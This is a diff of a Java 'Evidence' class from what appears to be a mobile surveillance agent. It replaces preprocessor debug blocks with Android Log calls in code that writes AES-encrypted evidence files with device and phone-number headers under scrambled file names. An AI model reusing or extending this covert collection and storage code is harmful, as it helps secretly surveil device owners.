@@ -109,14 +109,7 @@ public final class Evidence {
 	private static final long MIN_AVAILABLE_SIZE = 200 * 1024;
 
 	/** The Constant TAG. */
-	private static final String TAG = Class.class.getName();
-
-	// #ifdef DEBUG
-	/** The debug. */
-	private static Debug debug = new Debug("Evidence");
-
-	// #endif
-
+	private static String TAG = "Evidence";
 	/** The first space. */
 	boolean firstSpace = true;
 
@@ -182,20 +175,14 @@ public final class Evidence {
 	 */
 	public Evidence(final EvidenceType typeEvidenceId, final byte[] aesKey) {
 		this();
-		// #ifdef DBC
 		Check.requires(aesKey != null, "aesKey null");
-		// #endif
-
 		// agent = agent_;
 		this.typeEvidenceId = typeEvidenceId;
 		this.aesKey = aesKey;
 
 		encryption = new Encryption(aesKey);
-
-		// #ifdef DBC
 		// Check.ensures(agent != null, "createLog: agent null");
 		Check.ensures(encryption != null, "encryption null");
-		// #endif
 	}
 
 
@@ -217,17 +204,12 @@ public final class Evidence {
 	 */
 	public static int convertTypeEvidence(final int agentId) {
 		final int agentPos = agentId - AgentConf.AGENT;
-		// #ifdef DBC
 		Check.requires(TYPE_EVIDENCE != null, "Null TypeEvidence");
-		// #endif
 		if (agentPos >= 0 && agentPos < TYPE_EVIDENCE.length) {
 			final int typeLog = TYPE_EVIDENCE[agentPos].value();
 			return typeLog;
 		}
-
-		// #ifdef DEBUG
-		debug.warn("Wrong agentId conversion: " + agentId);
-		// #endif
+		Log.w(TAG,"Wrong agentId conversion: " + agentId);
 		return EvidenceType.UNKNOWN.value();
 	}
 
@@ -243,14 +225,11 @@ public final class Evidence {
 		free = Path.freeSpace();
 
 		if (free < MIN_AVAILABLE_SIZE) {
-			// #ifdef DEBUG
 			if (firstSpace) {
 				firstSpace = false;
 
-				debug.fatal("not enough space. Free : " + free);
+				Log.wtf(TAG,"not enough space. Free : " + free);
 			}
-			// #endif
-
 			return false;
 		} else {
 			return true;
@@ -306,15 +285,8 @@ public final class Evidence {
 			final EvidenceType evidenceType) {
 
 		this.typeEvidenceId = evidenceType;
-
-		// #ifdef DEBUG
-		debug.trace("createLog typeEvidenceId: " + evidenceType);
-		// #endif
-
-		// #ifdef DBC
+		Log.d(TAG,"createLog typeEvidenceId: " + evidenceType);
 		Check.requires(fconn == null, "createLog: not previously closed");
-		// #endif
-
 		timestamp = new Date();
 
 		int additionalLen = 0;
@@ -325,9 +297,7 @@ public final class Evidence {
 
 		enoughSpace = enoughSpace();
 		if (!enoughSpace) {
-			// #ifdef DEBUG
-			debug.trace("createEvidence, no space");
-			// #endif
+			Log.d(TAG,"createEvidence, no space");
 			return false;
 		}
 
@@ -345,76 +315,47 @@ public final class Evidence {
 		final boolean ret = Path.createDirectory(dir);
 
 		if (!ret) {
-			// #ifdef DEBUG
-			debug.error("Dir not created: " + dir);
-			// #endif
+			Log.e(TAG,"Dir not created: " + dir);
 			return false;
 		}
 
 		fileName = dir + name.encName;
-		// #ifdef DBC
 		Check.asserts(fileName != null, "null fileName");
 		Check.asserts(!fileName.endsWith(EvidenceCollector.LOG_EXTENSION),
 				"file not scrambled");
 		// Check.asserts(!fileName.endsWith("MOB"), "file not scrambled");
-		// #endif
-
-		// #ifdef DEBUG
-		debug.trace("createLog fileName:" + fileName);
-		// #endif
+		Log.d(TAG,"createLog fileName:" + fileName);
 		try {
 			fconn = new AutoFile(fileName);
 
 			if (fconn.exists()) {
 				close();
-				// #ifdef DEBUG
-				debug.fatal("It should not exist:" + fileName);
-				// #endif
-
+				Log.wtf(TAG,"It should not exist:" + fileName);
 				return false;
 			}
-
-			// #ifdef DEBUG
-			debug.info("Created: " + fileName);
-			// #endif
-
+			Log.i(TAG,"Created: " + fileName);
 			final byte[] plainBuffer = makeDescription(additionalData,
 					evidenceType);
-			// #ifdef DBC
 			Check.asserts(plainBuffer.length >= 32 + additionalLen,
 					"Short plainBuffer");
-			// #endif
-
 			// fconn.create();
 			// os = fconn.openDataOutputStream();
 
 			final byte[] encBuffer = encryption.encryptData(plainBuffer);
-			// #ifdef DBC
 			Check.asserts(encBuffer.length == encryption
 					.getNextMultiple(plainBuffer.length), "Wrong encBuffer");
-			// #endif
-
 			// scriviamo la dimensione dell'header paddato
 			fconn.write(Utils.intToByteArray(plainBuffer.length));
 			Log.d(TAG, Long.toString(fconn.getSize()));
 			// scrittura dell'header cifrato
 			fconn.append(encBuffer);
 			Log.d(TAG, Long.toString(fconn.getSize()));
-
-			// #ifdef DBC
 			Check.asserts(fconn.getSize() == encBuffer.length + 4,
 					"Wrong filesize");
-			// #endif
-
-			// #ifdef DEBUG
-			debug.trace("additionalData.length: " + plainBuffer.length);
-			debug.trace("encBuffer.length: " + encBuffer.length);
-			// #endif
-
+			Log.d(TAG,"additionalData.length: " + plainBuffer.length);
+			Log.d(TAG,"encBuffer.length: " + encBuffer.length);
 		} catch (final Exception ex) {
-			// #ifdef DEBUG
-			debug.error("file: " + name.fileName + " ex:" + ex);
-			// #endif
+			Log.e(TAG,"file: " + name.fileName + " ex:" + ex);
 			return false;
 		}
 
@@ -458,11 +399,8 @@ public final class Evidence {
 				.getPhoneNumber()).length;
 
 		final byte[] baseHeader = evidenceDescription.getBytes();
-		// #ifdef DBC
 		Check.asserts(baseHeader.length == evidenceDescription.length,
 				"Wrong log len");
-		// #endif
-
 		final int headerLen = baseHeader.length
 				+ evidenceDescription.additionalData
 				+ evidenceDescription.deviceIdLen
@@ -508,11 +446,8 @@ public final class Evidence {
 		}
 
 		final byte[] plainBuffer = makeDescription(additionalData, logType);
-		// #ifdef DBC
 		Check.asserts(plainBuffer.length >= 32 + additionalLen,
 				"Short plainBuffer");
-		// #endif
-
 		// buffer completo
 		final byte[] buffer = new byte[additionalData.length + data.length + 8];
 		final DataBuffer databuffer = new DataBuffer(buffer, 0, buffer.length);
@@ -557,25 +492,17 @@ public final class Evidence {
 		encData = encryption.encryptData(data, offset);
 
 		if (fconn == null) {
-			// #ifdef DEBUG
-			debug.error("fconn null");
-			// #endif
+			Log.e(TAG,"fconn null");
 			return false;
 		}
-
-		// #ifdef DEBUG
-		debug.info("writeEvidence encdata: " + encData.length);
-		debug.info("fileSize: " + fconn.getSize());
-		// #endif
-
+		Log.i(TAG,"writeEvidence encdata: " + encData.length);
+		Log.i(TAG,"fileSize: " + fconn.getSize());
 		try {
 			fconn.append(Utils.intToByteArray(data.length - offset));
 			fconn.append(encData);
 			fconn.flush();
 		} catch (final Exception e) {
-			// #ifdef DEBUG
-			debug.error("Error writing file: " + e);
-			// #endif
+			Log.e(TAG,"Error writing file: " + e);
 			return false;
 		}
 
@@ -604,11 +531,7 @@ public final class Evidence {
 			final byte[] token = (byte[]) bytelist.elementAt(i);
 			databuffer.write(token);
 		}
-
-		// #ifdef DEBUG
-		debug.trace("len: " + buffer.length);
-		// #endif
-
+		Log.d(TAG,"len: " + buffer.length);
 		return writeEvidence(buffer);
 	}
 
@@ -637,9 +560,7 @@ public final class Evidence {
 			// logInfo.atomicWriteOnce(message);
 
 		} catch (final Exception ex) {
-			// #ifdef DEBUG
-			debug.error(ex);
-			// #endif
+			Log.e(TAG,ex.toString());
 		}
 	}
 
